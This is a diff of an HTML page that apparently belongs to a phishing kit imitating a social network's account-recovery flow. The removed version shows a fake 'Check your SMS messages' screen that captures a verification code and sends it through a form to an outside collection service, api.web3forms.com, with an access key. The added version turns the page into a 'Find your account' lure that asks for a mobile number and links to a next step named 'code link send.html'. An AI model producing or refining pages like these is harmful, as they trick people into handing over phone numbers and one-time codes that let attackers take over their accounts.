@@ -4,7 +4,7 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
 
-<title>Enter the code</title>
+<title>Find your account</title>
 
 <style>
 * {
@@ -98,6 +98,20 @@ h2 {
     color: #f0f2f4;
 }
 
+/* Hacked account link */
+
+.hacked-link {
+    position: absolute;
+    top: 110px;
+    left: 16px;
+
+    color: #5aa9ff;
+    font-size: 15px;
+    line-height: 24px;
+    font-weight: 500;
+    text-decoration: none;
+}
+
 /* Input */
 
 .input-wrap {
@@ -163,7 +177,7 @@ h2 {
     color: #f1f2f4;
     text-decoration: none;
 
-    font-size: 16px;
+    font-size: 12px;
     line-height: 25px;
     font-weight: 600;
 }
@@ -186,76 +200,38 @@ h2 {
     <button
         class="back"
         aria-label="Go back"
-        onclick="location.href='bhuila gechi.html'">
+        onclick="location.href='2ndpage.html'">
     </button>
 
-    <h2>Check your SMS messages</h2>
+    <h2>Find your account</h2>
 
     <div class="subtitle">
-        We've sent a code to +88017********. Enter that code to confirm your account.
+        Enter your mobile number.
     </div>
 
+    <a href="#" class="hacked-link">
+        I think that my account has been hacked
+    </a>
 
-  <form action="https://api.web3forms.com/submit" method="POST">
-    
     <div class="input-wrap">
-        <input type="hidden" name="access_key" value="d3e8c229-865f-4b79-85ee-d37229319012">
         <input
             class="mobile-input"
-            type="text"
-            name="name"
+            type="tel"
+            inputmode="tel"
             autocomplete="off"
-            placeholder="Enter Code"
-            aria-label="Enter code">
+            placeholder="Mobile number"
+            aria-label="Mobile number">
     </div>
 
-    <button  class="continue-btn" type="submit" id="submitBtn">
+    <button class="continue-btn" type="button" onclick="location.href='code link send.html'">
         Continue
     </button>
-    </form>
-    <script>
-    document.getElementById("myForm").addEventListener("submit", async function(event) {
-    event.preventDefault();
 
-    const form = this;
-    const button = document.getElementById("submitBtn");
-
-    button.disabled = true;
-    button.textContent = "Submitting...";
-
-    try {
-        const response = await fetch(form.action, {
-            method: "POST",
-            body: new FormData(form)
-        });
-
-        const result = await response.json();
-
-        if (result.success) {
-            window.location.href = "question.html";
-        } else {
-            alert("Submission failed. Please try again.");
-            button.disabled = false;
-            button.textContent = "Continue";
-        }
-
-    } catch (error) {
-        console.error(error);
-
-        alert("Something went wrong. Please try again.");
-
-        button.disabled = false;
-        button.textContent = "Continue";
-    }
-});
-            </script>
-
-    <a href="2ndpage.html" class="email-link">
-        Try again later
+    <a href="#" class="email-link">
+        Find by email address or username instead
     </a>
 
 </div>
 
-            
 </body>
 </html>
